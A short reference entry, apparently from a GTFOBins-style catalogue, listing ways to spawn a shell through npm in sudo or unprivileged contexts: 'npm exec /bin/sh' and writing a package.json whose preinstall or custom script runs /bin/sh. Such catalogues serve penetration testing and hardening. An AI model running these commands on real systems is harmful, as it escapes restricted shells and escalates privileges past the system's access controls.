title: npm
html:
npm

Shell

Context: sudo, unprivileged

npm exec /bin/sh

Context: sudo, unprivileged

echo '{"scripts": {"preinstall": "/bin/sh"}}' >package.json
npm -C . i

Context: sudo, unprivileged

echo '{"scripts": {"xxx": "/bin/sh"}}' >package.json
npm -C . run xxx
